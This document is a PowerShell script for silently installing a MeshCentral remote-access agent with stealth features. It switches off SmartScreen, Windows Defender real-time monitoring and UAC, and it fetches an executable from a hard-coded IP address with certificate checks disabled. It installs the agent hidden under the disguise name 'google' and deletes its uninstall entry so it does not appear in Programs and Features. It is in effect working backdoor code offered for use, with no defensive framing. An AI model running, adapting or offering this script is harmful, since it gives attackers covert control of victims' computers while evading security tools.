# Silent MeshAgent Installer with Stealth
# Usage: Run as Administrator
# powershell -ExecutionPolicy Bypass -File install-agent.ps1

param(
    [string]$ServerUrl = "wss://85.158.110.250:8080/agent.ashx",
    [string]$MeshId = "",
    [string]$AgentName = "google",
    [string]$ServiceName = "google",
    [switch]$HideFromPrograms = $true,
    [switch]$DisableSmartScreen = $true
)

# Check admin rights
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] This script requires Administrator privileges" -ForegroundColor Red
    exit 1
}

Write-Host "[*] MeshAgent Silent Installer" -ForegroundColor Cyan

# Step 1: Disable SmartScreen (temporary)
if ($DisableSmartScreen) {
    Write-Host "[*] Disabling SmartScreen temporarily..." -ForegroundColor Yellow
    $smartscreenKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"
    $originalValue = Get-ItemProperty -Path $smartscreenKey -Name "EnableSmartScreen" -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $smartscreenKey -Name "EnableSmartScreen" -Value 0 -Force -ErrorAction SilentlyContinue
    
    # Also disable Windows Defender real-time monitoring temporarily
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
}

# Step 2: Disable UAC temporarily
Write-Host "[*] Disabling UAC temporarily..." -ForegroundColor Yellow
$uacKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$originalUac = Get-ItemProperty -Path $uacKey -Name "EnableLUA" -ErrorAction SilentlyContinue
Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue

# Step 3: Download agent from MeshCentral server
Write-Host "[*] Downloading agent..." -ForegroundColor Yellow
$agentPath = "$env:TEMP\meshservice.exe"
try {
    # Download signed agent from MeshCentral
    $downloadUrl = "https://85.158.110.250:8080/meshagents?script=1"
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($downloadUrl, $agentPath)
    Write-Host "[+] Agent downloaded to $agentPath" -ForegroundColor Green
} catch {
    Write-Host "[!] Download failed: $_" -ForegroundColor Red
    # Try alternative method
    try {
        Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPath -UseBasicParsing
        Write-Host "[+] Agent downloaded via Invoke-WebRequest" -ForegroundColor Green
    } catch {
        Write-Host "[!] All download methods failed" -ForegroundColor Red
        exit 1
    }
}

# Step 4: Install agent silently
Write-Host "[*] Installing agent..." -ForegroundColor Yellow
$installArgs = "-fullinstall"
$process = Start-Process -FilePath $agentPath -ArgumentList $installArgs -Wait -PassThru -WindowStyle Hidden
if ($process.ExitCode -eq 0) {
    Write-Host "[+] Agent installed successfully" -ForegroundColor Green
} else {
    Write-Host "[!] Installation may have issues (exit code: $($process.ExitCode))" -ForegroundColor Yellow
}

# Step 5: Hide from Programs and Features
if ($HideFromPrograms) {
    Write-Host "[*] Hiding from Programs and Features..." -ForegroundColor Yellow
    $uninstallKey = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\$ServiceName"
    if (Test-Path $uninstallKey) {
        Remove-Item -Path $uninstallKey -Recurse -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Removed from Programs and Features" -ForegroundColor Green
    } else {
        Write-Host "[*] Uninstall key not found (may already be hidden)" -ForegroundColor Yellow
    }
}

# Step 6: Restore security settings
Write-Host "[*] Restoring security settings..." -ForegroundColor Yellow
if ($DisableSmartScreen) {
    Set-ItemProperty -Path $smartscreenKey -Name "EnableSmartScreen" -Value 1 -Force -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
}
Set-ItemProperty -Path $uacKey -Name "EnableLUA" -Value 1 -Force -ErrorAction SilentlyContinue

# Step 7: Verify installation
Write-Host "[*] Verifying installation..." -ForegroundColor Yellow
$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Write-Host "[+] Service '$ServiceName' is running: $($service.Status)" -ForegroundColor Green
} else {
    Write-Host "[!] Service not found" -ForegroundColor Red
}

# Step 8: Clean up
Remove-Item -Path $agentPath -Force -ErrorAction SilentlyContinue
Write-Host "[*] Cleanup complete" -ForegroundColor Yellow

Write-Host "[+] Installation complete!" -ForegroundColor Green
Write-Host "[*] Agent should connect to: $ServerUrl" -ForegroundColor Cyan
